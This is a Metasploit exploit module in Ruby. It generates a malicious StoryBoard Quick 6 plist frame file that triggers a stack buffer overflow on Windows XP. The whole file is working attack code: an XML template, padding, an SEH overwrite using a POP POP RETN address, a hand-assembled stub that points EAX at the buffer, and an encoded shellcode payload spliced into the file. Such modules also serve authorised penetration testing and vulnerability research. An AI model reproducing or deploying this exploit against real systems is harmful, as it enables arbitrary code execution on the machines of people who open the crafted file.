require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'StoryBoard Quick 6 Memory Corruption Vulnerability',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in StoryBoard Quick 6.
      },
      'License'        => MSF_LICENSE,
      'Author'        => [ 'vt [nick.freeman@security-assessment.com]' ],
      'Version'        => '$Revision: 10394 $',
      'References'     =>
        [
          [ 'URL', 'http://security-assessment.com/files/documents/advisory/StoryBoard_Quick_6-Stack_Buffer_Overflow.pdf' ]
        ],
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => "\x00",
          'DisableNops'    => true,
          'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
          'EncoderOptions' =>
            {
              'BufferRegister' => 'EAX',
            }
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'Default (WinXP SP3 No DEP)',
            {
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Nov 30 2011',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name.',  "Frame-001.xml"]),
      ], self.class)
  end

  def exploit

    template = %Q|<plist version="1.0">
<dict>
<key>ID</key>
<integer>1</integer>
<key>Objects</key>
<array>
<dict>
<key>Size-X</key>
<real>134.00000000</real>
<key>Size-Y</key>
<real>667.00000000</real>
<key>Type</key>
<string>cLIB</string>
<key>Library</key>
<string>C:\\Program Files\\StoryBoard Quick 6\\Libraries\\Characters\\Woman 1.artgrid</string>
<key>ID</key>
<string>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAREPLACE_1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.xo</string>
<key>Colorization</key>
<dict>
<key>Arms</key>
<string>ff4b70ff</string>
<key>Eyes</key>
<string>ff00ff00</string>
<key>Hair</key>
<string>ff68502d</string>
<key>Face</key>
<string>fffdd8a1</string>
<key>REPLACE_2</key>
<string>ff070707</string>
<key>Skin</key>
<string>ffd7b583</string>
<key>Legs</key>
<string>ff06007e</string>
</dict>
<key>Whom</key>
<string>LINDA</string>
<key>Scale-X</key>
<real>0.74842578</real>
<key>Scale-Y</key>
<real>0.74842578</real>
<key>Offset-Y</key>
<real>41.60000610</real>
</dict>
<dict>
<key>Size-X</key>
<real>310.00000000</real>
<key>Size-Y</key>
<real>575.00000000</real>
<key>Type</key>
<string>cLIB</string>
<key>Library</key>
<string>C:\\Program Files\\StoryBoard Quick 6\\Libraries\\Characters\\Woman 2.artgrid</string>
<key>ID</key>
<string>30012.xo</string>
<key>Colorization</key> 
<dict>
<key>Arms</key>
<string>ff909090</string>
<key>Eyes</key>
<string>ff00ff00</string>
<key>Hair</key>
<string>ff090909</string>
<key>Face</key>
<string>ffff0837</string>
<key>Shoe</key>
<string>ff1100c2</string>
<key>Skin</key>
<string>ffb78d4f</string>
<key>Legs</key>
<string>ff050505</string>
</dict>
<key>Whom</key>
<string>C.J.</string>
<key>Scale-X</key>
<real>0.86817396</real>
<key>Scale-Y</key>
<real>0.86817396</real>
<key>Offset-Y</key>
<real>41.60000610</real>
</dict>
<dict>
<key>IsSelected</key>
REPLACE_3<true/>
<key>Size-X</key>
<real>682.00000000</real>
<key>Size-Y</key>
<real>565.00000000</real>
<key>Type</key>
<string>cLIB</string>
<key>Library</key>
<string>C:\\Program Files\\StoryBoard Quick 6\\Libraries\\Characters\\Woman 1.artgrid</string>
<key>ID</key>
<string>30013.xo</string>
<key>Colorization</key>
<dict>
<key>Arms</key>
<string>ff4b70ff</string>
<key>Eyes</key>
<string>ff00ff00</string>
<key>Hair</key>
<string>ff68502d</string>
<key>Face</key>
<string>fffdd8a1</string>
<key>Shoe</key>
<string>ff070707</string>
<key>Skin</key>
<string>ffd7b583</string>
<key>Legs</key>
<string>ff06007e</string>
</dict>
<key>Whom</key>
<string>LINDA</string>
<key>Scale-X</key>
<real>0.95718473</real>
<key>Scale-Y</key>
<real>0.95718473</real>
<key>Offset-Y</key>
<real>62.40469360</real>
</dict>
</array>
<key>FrameDB</key>
<dict>
<key>TXT-0006</key>
<data>
MDYvMDMvMTEgMjM6Mjg6MDMA
</data>
</dict>
<key>UN-Thumb</key>
<true/>
</dict>
</plist>
|

    sploit = template.gsub(/REPLACE_1/, "\xd9\xcf\xe5\x74")

    padd = "\x43" * 4256
    nseh = "\x90\xeb\x06\x90"
    seh  = "\x25\x12\xd1\x72" # POP, POP, RETN
    nops = "\x90"*9

    # set buffer register
    bufregstub =  "\x8b\xc4"   # mov eax, esp
    bufregstub += "\x33\xc9"   # xor ecx
    bufregstub += "\x83\xc1\x7f"  # add ecx, 7f
    bufregstub += "\x6b\xc9\x17"  # imul ecx,17
    bufregstub += "\x83\xc1\x7b"    # add ecx,7b
    bufregstub += "\x03\xc1"   # add eax,ecx # eax now points to buffer, ready to decode shellcode.
    
    sploit = sploit.gsub(/REPLACE_2/,padd + nseh + seh + nops + bufregstub + payload.encoded + ("\x44"*(11137-payload.encoded.length)))
  
    sploit = sploit.gsub(/REPLACE_3/, "\x45"*658)

    print_status("Creating '#{datastore['FILENAME']}' file ...")

    file_create(sploit)

  end

end
